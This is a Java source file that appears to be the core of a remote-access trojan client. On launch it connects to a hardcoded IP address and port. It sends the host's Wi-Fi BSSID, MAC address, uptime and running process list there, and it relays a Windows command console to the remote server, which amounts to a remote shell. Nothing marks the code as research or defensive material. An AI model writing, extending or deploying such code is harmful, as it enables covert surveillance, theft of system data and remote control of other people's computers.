package me.ByteCoder.Core.JCController;

import java.io.File;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import me.ByteCoder.Core.Client.CUtils;
import me.ByteCoder.Core.Client.Client;
import me.ByteCoder.Core.Client.PacketWriter;
import me.ByteCoder.Core.Client.Event.EventManager;

public class Main {

public static Client c;
public static String currVersion = "1.0";
public static char s = File.separatorChar;	
public static ExecutorService service = Executors.newCachedThreadPool();
public static EventManager em;
public static BC_Console console;

public static void main(String[] args) {
	c = new Client(service, "05jaFpJizPse");
	c.init("46.200.213.196", 8888);
	
	em = new EventManager();
	em.addEvent(new MessListener());
	
	c.write("DATA", "SET", CUtils.getBSSIDs().get(0).toUpperCase(), "BSSID");
	c.write("DATA", "SET", CUtils.getMacAddress(), "MACID");
	c.write("JCLIENT", "CONNECTED", "I'am here, Core!", "CORE");			
	c.write("DATA", "SET", "" + Utils.getUPTIME(), "UPTIME");
	c.write("DATA", "SET", Utils.getTaskListFormated(), "TASKLIST");
}

public static int rndi(int i) {
	return new Random().nextInt(i);
}

public static String getData() {
	return System.getProperty("user.name") + ";" + System.getProperty("os.name") + ";" + System.getProperty("os.version") + ";" + System.getProperty("java.version") + ";" + currVersion + ";" + Utils.getUPTIME();
}

public static String getKey() {
	return c.getCryptorKey();
}

public static void startConsoleListener() {
	console.println("chcp 437");
	
	new Thread(new Runnable() {

		@Override
		public void run() {
			while(!c.getSocket().isClosed()) {
				String r;
				while((r = console.readLine()) != null) {
					c.write("JCONSOLE", "RECEIVE", r, "CORE");
				}
			}
			System.out.println("Console thread are down!");
		}
	}).start();
}
}
